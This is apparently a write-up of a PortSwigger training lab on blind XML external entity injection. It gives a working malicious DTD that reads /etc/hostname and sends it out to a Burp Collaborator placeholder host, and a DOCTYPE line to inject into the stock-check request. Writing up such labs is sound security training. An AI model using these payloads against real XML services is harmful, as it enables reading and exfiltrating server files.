## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/37393827-6c23-4d95-b98b-401a11b8e7b5)

## Solution :

### Create a malicious DTD -
On the exploit server create a malicious DTD file with the following contents,

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;
```
Host this malicious.dtd file in our exploit server.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/19996b6e-471b-42dc-80ee-f8385d7e002b)

Click "Go to exploit server" and save the malicious DTD file on your server. Click "View exploit" and take a note of the URL

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/df7f8e6c-1372-4921-9e16-296ed632cd34)

You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/db33769a-1132-4b4e-8e2f-983cdf7dfabf)

Insert the following external entity definition in between the XML declaration and the stockCheck element:

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/d80c535c-c4f6-4d5d-b63b-8e32f1f4e292)


Go back to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/de8fdc48-d07d-43ba-8843-c0746ccd1974)


You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The HTTP interaction could contain the contents of the /etc/hostname file.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/4c8c572c-4546-49fa-87b9-7c9475b19c43)

Lab solved.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/728b70eb-99f3-4739-b210-6174fd9bd2a6)


